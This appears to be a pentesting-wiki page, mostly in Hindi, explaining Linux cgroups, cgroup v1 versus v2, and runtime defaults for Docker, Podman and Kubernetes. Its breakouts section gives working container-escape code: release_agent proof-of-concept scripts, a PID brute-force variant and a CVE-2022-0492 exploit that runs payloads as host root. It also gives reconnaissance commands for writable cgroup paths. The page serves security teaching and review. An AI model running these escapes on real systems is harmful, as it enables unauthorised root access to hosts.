# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

Linux **control groups** कर्नेल का वह तंत्र हैं जो प्रक्रियाओं को लेखांकन, सीमांकन, प्राथमिकता निर्धारण और नीति लागू करने के लिए एक साथ समूहित करने में उपयोग आता है। यदि namespaces मुख्यतः संसाधनों के दृश्य को अलग करने के बारे में हैं, तो cgroups मुख्यतः यह नियंत्रित करते हैं कि उन संसाधनों का किसी प्रक्रियाओं के सेट द्वारा **कितना** उपयोग किया जा सकता है और, कुछ मामलों में, वे **कौन-से संसाधन वर्ग** के साथ ही इंटरैक्ट कर सकते हैं। Containers लगातार cgroups पर निर्भर रहते हैं, भले ही उपयोगकर्ता उन्हें सीधे कभी न देखे, क्योंकि लगभग हर आधुनिक runtime को कर्नेल को यह बताने का तरीका चाहिए कि "ये प्रक्रियाएँ इस workload से संबंधित हैं, और इन पर ये resource नियम लागू होते हैं"।

इसीलिए container engines एक नए container को उसके अपने cgroup subtree में रखते हैं। एक बार process tree वहाँ होने पर, runtime memory को cap कर सकता है, PIDs की संख्या को limit कर सकता है, CPU उपयोग को weight कर सकता है, I/O को regulate कर सकता है, और device access को restrict कर सकता है। production environment में, यह multi-tenant सुरक्षा और साधारण ऑपरेशनल hygiene दोनों के लिए आवश्यक है। एक container जिसके पास सार्थक resource controls नहीं हैं, वह memory को exhaust कर सकता है, सिस्टम को प्रक्रियाओं से flood कर सकता है, या CPU और I/O का ऐसा monopolize कर सकता है कि host या पड़ोसी workloads अस्थिर हो जाएँ।

सुरक्षा के दृष्टिकोण से, cgroups दो अलग तरीकों से महत्वपूर्ण हैं। पहला, खराब या अनुपस्थित resource limits सीधे denial-of-service हमलों को सक्षम करते हैं। दूसरा, कुछ cgroup विशेषताएँ, खासकर पुराने **cgroup v1** सेटअप में, ऐतिहासिक रूप से जब container के अंदर से writable होती थीं तो शक्तिशाली breakout primitives बना देती थीं।

## v1 Vs v2

वाइल्ड में दो प्रमुख cgroup मॉडल हैं। **cgroup v1** कई controller hierarchies को expose करता है, और पुराने exploit writeups अक्सर वहाँ उपलब्ध अजीब और कभी-कभी अत्यधिक शक्तिशाली semantics के इर्द-गिर्द घूमते हैं। **cgroup v2** एक अधिक unified hierarchy और सामान्यतः साफ़ व्यवहार प्रस्तुत करता है। आधुनिक distributions धीरे-धीरे cgroup v2 को प्राथमिकता दे रहे हैं, पर mixed या legacy environments अभी भी मौजूद हैं, जिसका अर्थ है कि वास्तविक सिस्टम की समीक्षा करते समय दोनों मॉडल प्रासंगिक बने रहते हैं।

यह अंतर इसलिए मायने रखता है क्योंकि कुछ सबसे प्रसिद्ध container breakout कहानियाँ, जैसे कि **`release_agent`** के दुरुपयोग cgroup v1 में, बहुत खास तौर पर पुराने cgroup व्यवहार से जुड़ी होती हैं। एक पाठक जो किसी ब्लॉग पर cgroup exploit देखता है और फिर उसे अंधाधुंध रूप से आधुनिक cgroup v2-only सिस्टम पर लागू करने की कोशिश करता है, वह लक्ष्य पर वास्तव में क्या संभव है, इसे गलत समझने की सम्भावना रखता है।

## निरीक्षण

यह देखने का सबसे तेज़ तरीका कि आपका वर्तमान shell कहाँ स्थित है:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` फ़ाइल वर्तमान प्रक्रिया से संबंधित cgroup पथ दिखाती है। आधुनिक cgroup v2 होस्ट पर अक्सर एक समेकित प्रविष्टि दिखाई देती है। पुराने या hybrid होस्ट पर, आप कई v1 controller पथ देख सकते हैं। एक बार जब आप पथ जान लें, तो आप `/sys/fs/cgroup` के अंतर्गत संबंधित फ़ाइलों की जाँच कर सकते हैं ताकि सीमाएँ और वर्तमान उपयोग देख सकें।

cgroup v2 होस्ट पर, निम्नलिखित commands उपयोगी हैं:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
These files reveal which controllers exist and which ones are delegated to child cgroups. यह delegation मॉडल rootless और systemd-managed वातावरणों में मायने रखता है, जहाँ runtime केवल उसी subset of cgroup functionality को नियंत्रित कर पाएगा जिसे parent hierarchy वास्तव में delegate करती है।

## Lab

One way to observe cgroups in practice is to run a memory-limited container:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
आप PID-सीमित container भी आज़मा सकते हैं:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime उपयोग

Docker, Podman, containerd, और CRI-O normal operation के हिस्से के रूप में cgroups पर निर्भर करते हैं। फर्क आमतौर पर इस बात का नहीं होता कि वे cgroups का उपयोग करते हैं या नहीं, बल्कि कि **वे कौन से defaults चुनते हैं**, **वे systemd के साथ कैसे interact करते हैं**, **rootless delegation कैसे काम करता है**, और **configuration कितना engine स्तर पर नियंत्रित होता है बनाम orchestration स्तर पर**।

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` पृष्ठभूमि

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

इस तकनीक के काम करने के लिए, attacker को आमतौर पर निम्न चाहिए होता है:

- एक लिखने-योग्य **cgroup v1** hierarchy
- एक child cgroup बनाने या उपयोग करने की क्षमता
- `notify_on_release` सेट करने की क्षमता
- `release_agent` में एक path लिखने की क्षमता
- होस्ट के दृष्टिकोण से executable को resolve करने वाला path

### क्लासिक PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
यह PoC `release_agent` में एक payload path लिखता है, cgroup release को ट्रिगर करता है, और फिर host पर जनरेट की गई output फ़ाइल को पढ़ता है।

### पढ़ने योग्य चरण-दर-चरण

इसी विचार को चरणों में बाँटने पर समझना आसान हो जाता है।

1. एक writable cgroup बनाएँ और तैयार करें:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. उस होस्ट पथ की पहचान करें जो कंटेनर फ़ाइल सिस्टम के अनुरूप हो:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. host path से दिखाई देने वाली payload डालें:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup को खाली करके निष्पादन ट्रिगर करें:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
प्रभाव यह है कि payload होस्ट-साइड पर होस्ट के root privileges के साथ execute होता है। वास्तविक exploit में, payload आम तौर पर एक proof file लिखता है, एक reverse shell spawn करता है, या host state को modify करता है।

### Relative Path Variant Using `/proc/<pid>/root`

कुछ वातावरणों में, container filesystem का host path स्पष्ट नहीं होता या storage driver द्वारा छिपा होता है। ऐसे मामलों में payload path को `/proc/<pid>/root/...` के माध्यम से व्यक्त किया जा सकता है, जहाँ `<pid>` वर्तमान container में किसी प्रक्रिया का host PID होता है। यही relative-path brute-force variant का आधार है:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.

### CVE-2022-0492 वेरिएंट

2022 में, CVE-2022-0492 ने दिखाया कि cgroup v1 में `release_agent` में लिखते समय **initial** user namespace में `CAP_SYS_ADMIN` के लिए सही से जाँच नहीं की जा रही थी। इससे यह technique कमजोर kernels पर कहीं अधिक पहुँच योग्य हो गई क्योंकि एक container process जो cgroup hierarchy को mount कर सकता था, host user namespace में पहले से privileged हुए बिना `release_agent` लिख सकता था।

न्यूनतम exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
एक vulnerable kernel में, host `/proc/self/exe` को host root privileges के साथ execute करता है।

व्यवहारिक दुरुपयोग के लिए, शुरुआत इस बात की जाँच से करें कि environment अभी भी writable cgroup-v1 paths या dangerous device access को expose करता है या नहीं:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
यदि `release_agent` मौजूद और लिखने योग्य है, तो आप पहले से ही legacy-breakout क्षेत्र में हैं:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
यदि cgroup path स्वयं escape नहीं देता, तो अगला व्यावहारिक उपयोग अक्सर denial of service या reconnaissance होता है:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
ये कमांड जल्दी बताती हैं कि workload के पास fork-bomb करने की जगह है, मेमोरी का अत्यधिक उपयोग करने की क्षमता है, या writable legacy cgroup interface का दुरुपयोग कर सकता है।

## जांच

जब किसी target की समीक्षा करते समय, cgroup जांचों का उद्देश्य यह पता लगाना होता है कि कौन सा cgroup मॉडल उपयोग में है, container writable controller paths देखता है या नहीं, और क्या पुराने breakout primitives जैसे `release_agent` भी प्रासंगिक हैं।
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

यदि आप **cgroup v1**, writable controller mounts, और ऐसा container पाते हैं जिसके पास strong capabilities हों या जिसकी seccomp/AppArmor सुरक्षा कमजोर हो, तो इस संयोजन को सावधानीपूर्वक ध्यान देने की आवश्यकता है। cgroups अक्सर एक उबाऊ resource-management विषय के रूप में माना जाता है, लेकिन ऐतिहासिक रूप से वे कुछ सबसे शिक्षाप्रद container escape chains का हिस्सा रहे हैं — खासकर इसलिए कि "resource control" और "host influence" के बीच की सीमा हमेशा उतनी साफ़ नहीं थी जितनी लोग मानते थे।

## रनटाइम डिफ़ॉल्ट्स

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | सामान्य मैन्युअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम | Containers स्वतः cgroups में रखे जाते हैं; resource limits वैकल्पिक होते हैं जब तक कि उन्हें flags के साथ सेट न किया गया हो | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` न देना; `--device` की अनुमति देना; `--privileged` |
| Podman | डिफ़ॉल्ट रूप से सक्षम | `--cgroups=enabled` डिफ़ॉल्ट है; cgroup namespace के डिफ़ॉल्ट cgroup version पर निर्भर करते हैं (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | रनटाइम के माध्यम से डिफ़ॉल्ट रूप से सक्षम | Pods और containers को node runtime द्वारा cgroups में रखा जाता है; फाइन-ग्रेन्ड resource control `resources.requests` / `resources.limits` पर निर्भर करता है | resource requests/limits न देना; privileged device access; host-level runtime का misconfiguration |
| containerd / CRI-O | डिफ़ॉल्ट रूप से सक्षम | cgroups सामान्य lifecycle management का हिस्सा हैं | direct runtime configs जो device controls को ढीला करते हैं या legacy writable cgroup v1 interfaces को expose करते हैं |

महत्वपूर्ण अंतर यह है कि **cgroup की मौजूदगी** सामान्यतः डिफ़ॉल्ट होती है, जबकि **उपयुक्त resource constraints** अक्सर वैकल्पिक होते हैं जब तक कि स्पष्ट रूप से कॉन्फ़िगर न किए जाएँ।
{{#include ../../../../banners/hacktricks-training.md}}
